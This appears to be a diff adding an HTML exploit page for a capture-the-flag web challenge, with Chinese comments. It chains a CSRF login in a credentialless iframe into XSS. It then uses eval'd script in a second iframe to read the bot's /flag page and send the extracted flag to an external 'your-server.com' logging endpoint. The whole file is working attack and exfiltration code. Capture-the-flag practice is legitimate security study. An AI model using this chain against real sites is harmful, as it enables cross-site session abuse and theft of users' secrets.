@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<!-- Credentialless iframe: 載入 CSRF 頁面，無憑證執行（觸發 XSS 但不影響 bot 主會話） -->
+<iframe src="http://your-server.com/csrf-login.html" credentialless width="0" height="0"></iframe>
+
+<!-- Regular iframe: 載入 bot 原 /flag 頁面，維持 bot 會話（包含 FLAG） -->
+<iframe src="http://web:11202/flag" width="0" height="0"></iframe>
+
+<script>
+window.addEventListener('load', () => {
+    const csrfIframe = document.querySelector('iframe[credentialless]');
+    csrfIframe.contentDocument.forms[0].submit();  // 執行 CSRF，登入攻擊者帳戶觸發 XSS
+    
+    // XSS 可操縱 regular iframe (window.top[1])，讀取並外洩 FLAG
+    const mainIframe = document.querySelectorAll('iframe')[1];
+    mainIframe.contentWindow.eval(`
+        fetch('/flag').then(r => r.text()).then(t => {
+            const flag = t.match(/flag\\{[^}]+\\}/)[0];
+            fetch('https://your-server.com/log?flag=' + encodeURIComponent(flag));
+        });
+    `);
+});
+</script>
+</body>
+</html>
